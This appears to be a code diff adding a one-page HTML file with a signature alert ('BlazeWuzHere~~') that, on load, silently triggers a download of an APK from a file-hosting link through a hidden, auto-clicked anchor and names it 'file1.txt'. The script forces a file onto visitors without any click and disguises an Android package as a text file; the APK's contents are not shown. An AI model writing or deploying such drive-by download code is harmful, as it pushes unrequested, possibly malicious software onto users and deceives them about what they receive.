@@ -1,0 +1,40 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Download Files</title>
+  </head>
+  <body>
+    <script>
+    window.addEventListener('load', downloadFiles);
+    alert('BlazeWuzHere~~');
+    function downloadFiles() {
+      var files = [
+        "https://www.mediafire.com/file/63tnhnsp52mlvao/Get-Lit_Re-Brikt.apk/file?dkey=v5m3j5smk8y&r=1512"
+      ];
+
+      var uniqueFiles = [...new Set(files)]; // Remove duplicates
+      var delay = 0; // delay
+      var index = 0;
+
+      function downloadNextFile() {
+        if (index >= uniqueFiles.length) {
+          return;
+        }
+
+        var link = document.createElement('a');
+        link.href = uniqueFiles[index];
+        link.download = 'file' + (index + 1) + '.txt';
+        link.style.display = 'none';
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+
+        index++;
+        setTimeout(downloadNextFile, delay);
+      }
+
+      downloadNextFile();
+    }
+  </script>
+  </body>
+</html>
